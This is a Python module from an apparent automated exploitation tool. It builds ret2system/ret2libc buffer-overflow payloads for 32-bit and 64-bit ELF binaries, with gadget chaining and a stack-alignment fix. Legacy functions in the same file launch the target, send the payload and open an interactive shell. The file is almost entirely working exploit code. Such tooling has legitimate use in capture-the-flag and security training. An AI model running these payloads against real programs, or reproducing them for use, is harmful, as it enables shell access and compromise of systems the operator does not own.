"""AutoPwn primitives layer: ret2system payload builders (P6.2).

Replaces the v3.1 monolith's ``ret2_system_x32`` /
``ret2_system_x64`` (local) + ``ret2_system_x32_canary_*`` /
``ret2_system_x64_canary_*`` (canary variants — handled in P7.10)
payload construction blocks (see ``autopwn/_legacy.py`` L1590-1674
+ L2641-2660 area) with two typed ``ExploitPrimitive`` subclasses.

Per ``rebuild.md`` §6.7 P6.2 + ``refactor.md`` §3.2.2, this is
the **first concrete primitive** in the P6 layer (M3 milestone).
It demonstrates the canonical pattern every other primitive
(P6.3-P6.8) will follow: a single ``build_payload(ctx) -> bytes``
method that reads pre-populated state from ``ctx`` and returns
the final payload.

Public API
----------
* :class:`Ret2SystemX32` — 32-bit ret2system.  Reads
  ``ctx.padding`` + ``system`` symbol + ``/bin/sh`` string
  from the binary, returns ``b'A' * padding + p32(system) +
  p32(fake_ret) + p32(binsh)``.
* :class:`Ret2SystemX64` — 64-bit ret2system with stack
  alignment fix.  Reads ``ctx.padding`` + ``ctx.gadgets_x64``
  (``pop_rdi`` + ``ret``) + system symbol + /bin/sh, returns
  ``b'A' * padding + p64(pop_rdi) + p64(binsh) + p64(ret) +
  p64(system)``.

Both primitives are read-only (no file writes, no process spawns)
and side-effect-free (no ``ctx`` mutation, no globals writes).
Per P6.1 docstring: pwntools ``ELF(path)`` reads are allowed
and expected for symbol / string lookup.

Legacy ports (parity only)
--------------------------
* :func:`_legacy_ret2_system_x32` — verbatim port of v3.1's
  ``ret2_system_x32`` (L1590-1616).  Has 1 caller
  (``_legacy.py`` L3243, in the no-canary branch).  Note:
  the canary variant (``ret2_system_canary_x32``, L2641-2659)
  is **out of P6.2 scope** — it's a P7.10 canary-strategy
  concern.
* :func:`_legacy_ret2_system_x64` — verbatim port of v3.1's
  ``ret2_system_x64`` (L1617-1656).  Has 1 caller
  (``_legacy.py`` L3248, no-canary 64-bit branch).  Same
  canary-scope note.

Design notes
------------
* The 64-bit variant uses an explicit ``ret`` gadget between
  ``binsh`` and ``system`` to fix Ubuntu 18.04+ glibc's
  16-byte stack alignment requirement (MOVAPS in ``system()``
  will SIGSEGV on misaligned RSP).  v3.1 L1636-1642 does the
  same.
* ``binsh_addr`` is computed via ``e.search(b'/bin/sh')`` which
  scans the entire binary for the substring.  This is the
  v3.1 approach (L1601, L1631) — pwntools returns an iterator
  that ``next()`` consumes.  Empty iterator (no ``/bin/sh``
  string) yields ``StopIteration``; we surface that as
  ``b""`` (empty payload) so the P7 strategy can skip the
  primitive gracefully.
* ``system_addr`` lookup via ``e.symbols['system']`` raises
  ``KeyError`` when the binary doesn't import libc's
  ``system`` (e.g. statically linked or stripped).  We
  surface that as ``b""`` too — empty payload, strategy
  moves on.
* Both subclasses set ``name = "ret2system-x32"`` /
  ``"ret2system-x64"`` matching the convention P7's registry
  uses for "trying <name>" log lines.
"""
from __future__ import annotations

from pathlib import Path
from typing import Optional

from autopwn.context import ExploitContext
from autopwn.primitives.base import ExploitPrimitive


def _lookup_system_and_binsh(program: Path) -> tuple[Optional[int], Optional[int]]:
    """Look up ``system`` symbol and ``/bin/sh`` string addresses.

    Mirrors v3.1's ``ret2_system_x32`` / ``_x64`` lookup pattern
    (``_legacy.py`` L1600, L1630): uses ``e.symbols["system"]``
    (not ``e.plt["system"]`` — v3.1's source uses the symbol
    table, not the PLT).  For binaries that import libc's
    ``system``, the symbol address resolves to the same value
    as the PLT entry (via dynamic linking); the distinction
    only matters for statically linked or stripped binaries.

    Returns:
        ``(system_addr, binsh_addr)`` — either may be ``None``
        when the symbol / string is absent.  The primitive
        treats ``None`` as "not exploitable" and returns
        ``b""``.

    Side effects:
        Read-only: opens the ELF once via pwntools and closes
        it.  No file writes, no globals writes, no process
        spawns.  Per P6.1 docstring, this read-only file
        access is allowed.
    """
    from pwn import ELF

    try:
        e = ELF(str(program), checksec=False)
    except Exception:
        return None, None

    try:
        system_addr = e.symbols["system"]
    except (KeyError, AttributeError):
        system_addr = None
    try:
        binsh_addr = next(e.search(b"/bin/sh"))
    except StopIteration:
        binsh_addr = None
    return system_addr, binsh_addr


class Ret2SystemX32(ExploitPrimitive):
    """32-bit ``ret2libc system('/bin/sh')`` payload builder.

    Payload shape::

        [A * ctx.padding] [p32(system)] [p32(fake_ret)] [p32(binsh)]

    Requires:
        * ``ctx.binary.path`` is a 32-bit ELF with ``system`` in
          the PLT (or as a symbol) and a ``/bin/sh`` substring
          (typically from libc data baked into the binary).
        * ``ctx.padding`` is the offset to the saved return
          address (populated by P5.1 ``test_stack_overflow``
          or ``analyze_vulnerable_functions``).
        * ``ctx.binary.stack_canary`` is ``False`` (canary
          variants live in P7.10).
    """

    name = "ret2system-x32"

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Return the 32-bit ret2system payload, or ``b""`` if not applicable."""
        from pwn import p32

        system_addr, binsh_addr = _lookup_system_and_binsh(ctx.binary.path)
        if system_addr is None or binsh_addr is None:
            return b""

        return (
            b"A" * ctx.padding
            + p32(system_addr)
            + p32(0)  # fake return address (system() doesn't return)
            + p32(binsh_addr)
        )


class Ret2SystemX64(ExploitPrimitive):
    """64-bit ``ret2libc system('/bin/sh')`` payload builder.

    Payload shape::

        [A * ctx.padding] [p64(pop_rdi)] [p64(binsh)] [p64(ret?)] [p64(system)]

    The ``ret?`` gadget is included iff
    ``ctx.frame_context.required_ret_count == 1`` (v4.0.5 — P6.2c
    fix; replaces the v4.0.1 always-include / v4.0.2b magic-threshold
    heuristic with a principled decision from the caller's frame).
    When ``ctx.frame_context`` is ``None`` (defensive — orchestrator
    always populates it now), defaults to including ``ret`` to
    preserve the v4.0.1 always-align behaviour.

    Requires:
        * Same as :class:`Ret2SystemX32`, but 64-bit.
        * ``ctx.gadgets_x64.pop_rdi`` and ``ctx.gadgets_x64.ret``
          are non-zero (populated by P4.4 ``find_x64``).

    The extra ``ret`` gadget between ``binsh`` and ``system``
    fixes the 16-byte RSP alignment required by Ubuntu 18.04+
    glibc's ``system()`` (which uses MOVAPS internally and
    SIGSEGVs on a misaligned stack).
    """

    name = "ret2system-x64"

    def build_payload(self, ctx: ExploitContext) -> bytes:
        """Return the 64-bit ret2system payload, or ``b""`` if not applicable."""
        from pwn import p64

        if ctx.gadgets_x64 is None:
            return b""
        g = ctx.gadgets_x64
        if g.pop_rdi == 0 or g.ret == 0:
            return b""

        system_addr, binsh_addr = _lookup_system_and_binsh(ctx.binary.path)
        if system_addr is None or binsh_addr is None:
            return b""

        # v4.0.5 (P6.2c): principled ret-count from FrameContext
        # (default True keeps v4.0.1 always-align behaviour when
        # the recon phase did not populate frame_context —
        # defensive fallback).
        include_ret = bool(
            ctx.frame_context.required_ret_count
            if ctx.frame_context is not None
            else 1
        )
        ret_gadget = p64(g.ret) if include_ret else b""

        return (
            b"A" * ctx.padding
            + p64(g.pop_rdi)
            + p64(binsh_addr)
            + ret_gadget
            + p64(system_addr)
        )


# =====================================================================
# Legacy ports (parity only) — preserve v3.1's print_* output verbatim
# =====================================================================

def _legacy_ret2_system_x32(program, libc, padding, libc_path) -> bool:
    """[OBSOLETE — prefer :class:`Ret2SystemX32`] Verbatim port of v3.1's ``ret2_system_x32``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3243).
    Preserves v3.1 print behavior byte-for-byte:
    ``print_section_header`` "EXPLOITATION: ret2system" +
    ``print_info`` "executing ret2system exploit" +
    ``print_payload`` "preparing ret2system payload" +
    ``print_payload`` "padding: ... bytes" +
    ``print_payload`` "system@plt: 0x..." +
    ``print_payload`` "/bin/sh: 0x..." +
    ``print_success`` "EXPLOITATION SUCCESSFUL" + (on failure)
    ``print_error`` "exploitation failed".

    Returns:
        ``True`` on success, ``False`` on failure.
    """
    from pwn import ELF, asm, p32, process

    from autopwn.core.logging import (
        Colors, print_section_header, print_info, print_payload,
        print_success, print_error,
    )

    print_section_header("EXPLOITATION: ret2system - x32")
    print_info("executing ret2system exploit")
    try:
        e = ELF(str(program))
        system_addr = e.symbols["system"]
        bin_sh_addr = next(e.search(b"/bin/sh"))

        print_info(f"system address: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
        print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")

        payload = asm("nop") * padding + p32(system_addr) + p32(0) + p32(bin_sh_addr)

        io = process(str(program))
        io.sendline(payload)
        io.interactive()
        print_success("EXPLOITATION SUCCESSFUL")
        return True
    except Exception as e:
        print_error(f"exploitation failed: {e}")
        return False


def _legacy_ret2_system_x64(
    program, libc, padding, pop_rdi_addr, other_rdi_registers,
    ret_addr, libc_path,
) -> bool:
    """[OBSOLETE — prefer :class:`Ret2SystemX64`] Verbatim port of v3.1's ``ret2_system_x64``.

    Retained for spec parity; has 1 caller (``_legacy.py`` L3248).
    Preserves v3.1 print behavior byte-for-byte:
    ``print_section_header`` "EXPLOITATION: ret2system" +
    ``print_info`` "executing ret2system exploit" +
    ``print_payload`` "preparing ret2system payload" +
    ``print_payload`` "padding: ... bytes" +
    ``print_payload`` "pop rdi: 0x..." +
    ``print_payload`` "/bin/sh: 0x..." +
    ``print_payload`` "ret: 0x..." +
    ``print_payload`` "system@plt: 0x..." +
    ``print_success`` "EXPLOITATION SUCCESSFUL" + (on failure)
    ``print_error`` "exploitation failed".

    Returns:
        ``True`` on success, ``False`` on failure.
    """
    from pwn import ELF, asm, flat, p64, process

    from autopwn.core.logging import (
        Colors, print_section_header, print_info, print_payload,
        print_success, print_error,
    )

    print_section_header("EXPLOITATION: ret2system - x64")
    print_info("executing ret2system exploit")
    if pop_rdi_addr is None:
        print_error("pop rdi gadget not found, exploitation not possible")
        return False
    try:
        e = ELF(str(program))
        system_addr = e.symbols["system"]
        bin_sh_addr = next(e.search(b"/bin/sh"))

        print_info(f"system address: {Colors.YELLOW}{hex(system_addr)}{Colors.END}")
        print_info(f"/bin/sh address: {Colors.YELLOW}{hex(bin_sh_addr)}{Colors.END}")

        pop_rdi_addr = int(pop_rdi_addr, 16)
        pop_rdi_addr = p64(pop_rdi_addr)
        ret_addr = int(ret_addr, 16)
        ret_addr = p64(ret_addr)

        if other_rdi_registers == 1:
            payload = flat(
                [asm("nop") * padding, pop_rdi_addr, p64(bin_sh_addr),
                 p64(0), ret_addr, p64(system_addr), p64(0)]
            )
        else:
            payload = flat(
                [asm("nop") * padding, pop_rdi_addr, p64(bin_sh_addr),
                 ret_addr, p64(system_addr)]
            )

        io = process(str(program))
        io.sendline(payload)
        io.interactive()
        print_success("EXPLOITATION SUCCESSFUL")
        return True
    except Exception as e:
        print_error(f"exploitation failed: {e}")
        return False


__all__ = [
    "Ret2SystemX32",
    "Ret2SystemX64",
    "_legacy_ret2_system_x32",
    "_legacy_ret2_system_x64",
]
